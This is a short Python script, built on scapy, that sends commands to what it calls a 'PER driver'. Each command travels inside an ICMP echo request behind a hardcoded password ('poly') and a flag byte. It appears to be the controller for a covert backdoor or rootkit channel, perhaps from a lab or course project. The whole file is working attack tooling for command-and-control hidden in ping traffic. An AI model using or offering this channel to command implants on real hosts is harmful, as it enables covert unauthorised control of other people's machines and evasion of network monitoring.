from scapy.all import IP, ICMP, send
import argparse

PASSWORD = "poly"

parser = argparse.ArgumentParser(
    prog='sender', description="Send commands to PER driver")

parser.add_argument('IP')
parser.add_argument('COMMAND')

args = parser.parse_args()

payload = bytearray()

payload += PASSWORD.encode('utf-8')
payload += bytes([1])  # flag
payload += args.COMMAND.encode('utf-8')

packet = IP(dst=args.IP) / ICMP(type=8, id=0x1234, seq=1) / bytes(payload)

send(packet)

print("OK")
